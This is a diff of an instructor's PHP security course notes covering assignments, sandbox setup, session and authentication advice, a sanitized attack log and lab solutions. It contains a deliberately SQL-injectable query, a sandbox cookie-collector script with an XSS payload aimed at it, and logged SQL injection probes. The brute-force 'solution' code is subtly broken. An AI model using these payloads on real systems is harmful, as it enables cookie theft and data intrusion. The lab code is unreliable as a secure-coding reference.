@@ -1,6 +1,73 @@
 # PHP SECURITY CLASS NOTES
 
-Last: http://localhost:8885/#/3/34
+Last: http://localhost:8885/#/5/18
+
+## Assignments
+For Wed 18 Jan 2023:
+* SQL Injection: Portal Exercise
+* Brute Force Detector Class Exercise
+* Brute Force Zed Attack Proxy Project Exercise
+* Cross-Site Scripting (XSS): Tidy Class Exercise #1
+* Cross-Site Scripting (XSS): Portal Exercise
+* Cross Site Request Forgery (CSRF) Portal Exercise
+* Security Misconfiguration Portal Exercise
+* External XML Entities Portal Exercise
+
+* Command Injection lab
+* Unrestricted File Inclusion Lab
+
+For Wed 11 Jan 2023:
+* Refresh the VM using the updated Vagrantfile
+  * Also: update the existing software (see "Expanded VM Installation Instructions" below)
+* Application Setup: Zed Attack Proxy
+* Try your hand at cracking passwords using `hashcat`
+
+## Security App Login
+Choose "Login"
+* Username: admin
+* Password: password
+
+## TODO
+* Find reference in https://wiki.php.net/rfc for deprecated back tics
+
+* Check for auth/ACL examples:
+
+* Brute Force Detector Class Exercise
+  * Image doesn't show up
+  * Rewrite to make worse: distinguish between user/pwd
+```
+$stmt   = $pdo->query("SELECT * FROM users WHERE user='$username' AND password='$pass'");
+```
+* Cross Site Request Forgery (CSRF) Portal Exercise
+  * Move the form into "with.php" so that you can add extra security
+* OrderApp: make sure it's working (insecurely)
+* Sandbox/public/hack_me.php:
+  * Make sure entries are logged
+```
+<?php
+// sandbox/public/hack_me.php
+$logFile = __DIR__ . '/' date('Y-m-d') . '.log';
+$flower  = __DIR__ . '/images/hacked.png';
+if ($_POST['data']) {
+    file_put_contents($logFile, base64_decode($_POST['data']));
+}
+readfile($flower);
+```
+
+* Get updated course slides to Jan
+
+* Q: Example using DOM to clean allowed HTML
+* A: TBD
+
+* Q: Find article on password complexity
+* A: TBD
+
+* Q: Find article that documents the 2-stage SQL injection attack
+* A: https://bertwagner.com/posts/how-to-steal-data-using-a-second-order-sql-injection-attack/
+
+* Get a `Faraday Bag` for your keyless entry vehicle!
+  * https://www.bbc.com/news/business-47023003
+  * https://www.locksmiths.co.uk/faq/keyless-car-theft/
 
 ## Docker Container Instructions
 * Install Docker and Docker Compose
@@ -29,41 +96,19 @@ docker run hello-world
 10.20.20.10    security sandbox orderapp phpmyadmin
 ```
 
-
-## Assignments
-For Mon 16 Jan 2023:
-
-* SQL Injection: Portal Exercise
-* Brute Force Detector Class Exercise
-* Brute Force Zed Attack Proxy Project Exercise
-* Cross-Site Scripting (XSS): Tidy Class Exercise #1
-* Cross-Site Scripting (XSS): Portal Exercise
-* Cross Site Request Forgery (CSRF) Portal Exercise
-* Security Misconfiguration Portal Exercise
-* External XML Entities Portal Exercise
-
-For Wed 11 Jan 2023:
-* Refresh the VM using the updated Vagrantfile
-  * Also: update the existing software (see "Expanded VM Installation Instructions" below)
-* Application Setup: Zed Attack Proxy
-* Try your hand at cracking passwords using `hashcat`
-
-## TODO
-* Get updated course slides to Jan
-
-* Q: Example using DOM to clean allowed HTML
-* A: TBD
-
-* Q: Find article on password complexity
-* A: TBD
-
-* Q: Find article that documents the 2-stage SQL injection attack
-* A: https://bertwagner.com/posts/how-to-steal-data-using-a-second-order-sql-injection-attack/
-
-
-* Get a `Faraday Bag` for your keyless entry vehicle!
-  * https://www.bbc.com/news/business-47023003
-  * https://www.locksmiths.co.uk/faq/keyless-car-theft/
+## Running Docker in VM
+If you get the message:
+```
+```
+* See: https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user
+* Add "vagrant" to "docker" group:
+```
+sudo usermod -aG docker $USER
+```
+Also try this:
+```
+sudo snap install docker
+```
 
 ## Expanded VM Installation Instructions
 To install the VM, use this Vagrantfile (instead of the one provided):
@@ -85,8 +130,11 @@ Update the VM
 sudo apt install -y php8.1
 sudo /etc/init.d/apache2 restart
 ```
-su
+
 ## General Notes
+PHP Road Map:
+* https://wiki.php.net/rfc
+
 ### LAB NOTES
 * Good Overview of the Stats and Costs:
   * https://www.thesslstore.com/blog/80-eye-opening-cyber-security-statistics-for-2019/
@@ -365,6 +413,11 @@ LAB: quick test: download form, make a change, submit manually, and see that you
 * 4: Provide a logout option which destroys the session, expires the cookie and unsets data
 * 5: Keep sessions as short as possible (but keep usability in mind!)
 * 6: Be cautious about fixed session IDs (i.e. "remember me")!!!
+* 7: Be sure to disable any URL rewriting involve session IDs
+  * `session.use_trans_sid`
+  * See: https://www.php.net/manual/en/session.configuration.php#ini.session.use-trans-sid
+  * This is preferred: https://www.php.net/manual/en/session.configuration.php#ini.session.use-only-cookies
+    * Setting this on overrides trans sid
 
 ## Security Misconfig
 * 1: Keep all open source + other software updated
@@ -385,7 +438,18 @@ LAB: quick test: download form, make a change, submit manually, and see that you
   * Might be able to use a "headless" browser such as `Selenium` (https://docs/seleniumhqorg/)
 * 3: Unit testing might help
   * BUT: unit testing won't help with javascript
-
+* 4: Authentication / Authorization strategies:
+  * Set up a software event system (e.g. laminas/laminas-eventmanager)
+    * Set up 2 events, one is "CheckAuth", the other is "CheckAccess"
+    * Trigger the events just before sensitive ops
+    * Attach the appropriate "listeners" to handle the events
+  * Using a MiddleWare pipeline
+    * Set up a middleware pipeline (e.g. mezzio)
+    * Create an Authentication middleware class
+    * Create an Authorization middleware class
+    * These two would be placed early in the pipeline
+    * They would check the request URI to see what action is going to be performed
+    * They would stop any unauthorized/unauthenticated action for certain specified sensitive ops
 ## Unvalidated Redirects and Forwards
 * Also called "Unauthorized Redirects" or "Open Redirects"
 
@@ -1128,6 +1192,10 @@ if(isset($_GET['img'])) {
   * Need to update that screenshot!
 * http://localhost:8885/#/3/68
   * NOTE: `track_errors` removed in PHP 8
+* http://localhost:8885/#/5/13
+  * Index "0" is undefined!
+* http://localhost:8885/#/5/7
+  * "lab" s/be "Lab"
 
 ## Actual Attacks from Customer Access Log (sanitized)
 ```
@@ -1149,4 +1217,79 @@ if(isset($_GET['img'])) {
 [Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/Data21293, referer: http://second.site.com//Data21293/NYIKUGY5434231.mdb
 [Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/review.asp?id=1%20union%20select%201,2,3,4,5,admin,7,8,9,password,11%20%20from%20cnhww
 [Sun Jul 21 23:05:15 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/left.asp
+```
+
+## LAB SOLUTIONS
+Brute Force
+```
+<?php
+use SecurityApp\App;
+global $config;
+/* This is the code file you need to modify */
+/* App::getPdo() returns a valid PDO instance */
+/* App::getMysqli() returns a valid mysqli instance */
+
+if( isset( $_REQUEST['Login'] ) ) {
+	$time_current = time();
+	$time_stored  = $_SESSION['time'] ?? $time_current;
+	// add a safety check to see if login requests are too frequent
+	if (($time_current - $time_stored) < 1000) {
+		error_log($_SERVER['REQUEST_URL'] . ':' . $_SERVER['REMOTE_ADDR'] . ': Sequential request less than 1 second detected');
+	} else {
+		$username = strip_tags($_REQUEST['username'] ?? '');
+		$pass = password_hash($_REQUEST['password'], PASSWORD_DEFAULT);
+		try{
+			$pdo    = App::getPdo($config);
+			$stmt   = $pdo->prepare("SELECT * FROM users WHERE user=? AND password=?");
+			$stmt->execute([$username, $pass]);
+			$result = $stmt->fetch(PDO::FETCH_ASSOC);
+		}catch(Exception $e){
+			exit('<pre>' . $e->getMessage() . '</pre>');
+		}
+		if( $result && count($result) ) {
+			// Login Successful
+			App::$html .= "<p>Welcome to the password protected area " . $result['user'] . "</p>";
+			App::$html .= '<img src="hackable/users/' . $result['avatar'] . '" />';
+		} else {
+			//Login failed
+			App::$html .= "<pre><br>Username and/or password incorrect.</pre>";
+		}
+	}
+	$_SESSION['time'] = $time_current;
+}
+```
+Stored XSSS Lab
+* This isn't not yet complete:
+```
+<?php
+/* This is the code file you need to modify */
+global $config;
+use SecurityApp\App;
+if (isset($_POST['type'])) {
+    $type = $_POST['type'] ?? 'orange';
+    $stmt = App::getPdo($config)->query("SELECT * FROM flowers WHERE type = '$type'");
+    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+}
+
+$name   = strip_tags($result['name'] ?? 'orange');
+$folder = strip_tags($result['folder'] ?? '/images/');
+
+// If "pink" is selected, hacked code ends up looking like this:
+//$folder = 'http://sandbox/hack_me.php?data=<script>document.cookie</script>" style="width:1px;height:1px;" /><img src="';
+//$name   = 'http://sandbox.com/images/hacked';
+
+$ok = 0;
+$allowed = glob(SRC_DIR . '/public/images/*.png');
+$name = $name . '.png';
+foreach ($allowed as $fn) {
+	if (basename($fn) === $name) {
+		$ok++;
+		break;
+	}
+}
+if ($ok) {
+	App::$html .= '<img src="' . $folder . $name . '" width="50%"/>';
+} else {
+	App::$html .= 'Unknown image';
+}
 ```
